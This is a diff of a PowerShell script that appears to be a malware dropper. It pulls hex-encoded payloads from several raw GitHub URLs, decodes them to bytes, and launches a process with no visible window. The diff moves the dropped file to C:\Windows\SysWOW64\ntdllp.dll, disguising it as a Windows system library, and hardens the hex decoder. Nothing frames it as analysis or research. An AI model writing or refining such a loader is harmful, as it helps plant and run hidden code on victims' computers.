@@ -2,13 +2,14 @@ $urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe
 $urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt"
 $urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/b.txt"
 $urlD = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/c.txt"
-$filePath = "C:\Users\Admin\Downloads\dir4\nidll.xml"
+$filePath = "C:\Windows\SysWOW64\ntdllp.dll"
 $clipText = "SteF6b2WrAgu"
 function HexToBytes {
     param([string]$hexStr)
-    $byteArr = [byte[]]::new($hexStr.Length / 2)
-    for ($i = 0; $i -lt $hexStr.Length; $i += 2) {
-        $byteArr[$i/2] = [convert]::ToByte($hexStr.Substring($i, 2), 16)
+    $cleanHex = $hexStr -replace '[^0-9A-Fa-f]', ''
+    $byteArr = [byte[]]::new($cleanHex.Length / 2)
+    for ($i = 0; $i -lt $cleanHex.Length; $i += 2) {
+        $byteArr[$i/2] = [convert]::ToByte($cleanHex.Substring($i, 2), 16)
     }
     return $byteArr
 }
@@ -42,4 +43,3 @@ $psi2.UseShellExecute = $false
 $psi2.CreateNoWindow = $true
 $process2 = [System.Diagnostics.Process]::Start($psi2)
 $process2.WaitForExit()
-
